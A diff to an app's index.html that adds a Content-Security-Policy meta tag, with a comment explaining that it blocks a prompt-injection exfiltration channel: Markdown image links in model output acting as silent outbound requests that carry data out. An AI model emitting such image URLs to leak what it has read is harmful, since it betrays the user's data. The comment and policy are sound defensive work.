@@ -3,6 +3,35 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!--
+      What the renderer may fetch. The same string is in `src-tauri/tauri.conf.json`
+      under `app.security.csp`, and it is here as well *because that one does not
+      apply in development*: Tauri sets the header only on its own
+      `tauri://localhost` asset protocol, and `npm run tauri dev` navigates to the
+      Vite server instead, so nothing injects it. A meta tag is carried by whoever
+      serves the HTML, which is both of them.
+
+      **The threat this closes is the transcript.** Model output is rendered as
+      Markdown, and `![](https://somewhere/?x=…)` is a silent outbound GET to a URL
+      the model chose — the exfiltration channel a prompt injection reaches for once
+      it has read something worth sending. `react-markdown` escapes raw HTML, so
+      there was never a script hole; there was a *subresource* hole, and these are
+      the directives that carry a URL out of the window.
+
+      **`default-src`, `script-src` and `style-src` are deliberately absent.**
+      Monaco creates `<style>` elements at runtime for its themes and
+      `@vitejs/plugin-react` injects an inline module preamble in dev, so a
+      `default-src 'self'` that those two inherit would break the editor in the
+      packaged app and the whole page under `npm run dev`. Restricting them buys
+      nothing here anyway: the scripts are the bundle, and the bundle is not what an
+      attacker gets to write. Naming only the fetch directives keeps this policy
+      honest about what it is for, and keeps it out of the way of the hashes Tauri
+      manages for `script-src` in a production build.
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="img-src 'self' data: blob:; media-src 'self' data: blob:; font-src 'self' data:; object-src 'none'; frame-src 'none'; worker-src 'self' blob:; connect-src 'self' ipc: http://ipc.localhost ws://localhost:5190; base-uri 'none'; form-action 'none'"
+    />
     <title>ADE</title>
     <script type="module" src="/src/main.tsx" defer></script>
   </head>
